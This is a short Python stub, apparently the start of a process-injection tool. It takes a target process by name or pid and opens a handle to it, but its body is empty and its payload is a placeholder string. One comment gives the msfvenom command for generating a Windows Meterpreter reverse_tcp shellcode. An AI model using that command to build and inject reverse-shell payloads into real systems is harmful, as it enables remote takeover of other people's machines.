from process import Process
from argparse import ArgumentParser

if __name__ == "__main__":
   parser = ArgumentParser() 
   parser.add_argument("-id", "--by-id", default=False, help="process will be identified by pid instead of name")
   parser.add_argument("PROC", help="the target process")

   args = parser.parse_args()
   
   # msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= LPORT= -f py
   payload = bytearray(
      "Testing"
   )
   
   with Process(args.PROC, args.by_id) as ps_handle:
      pass
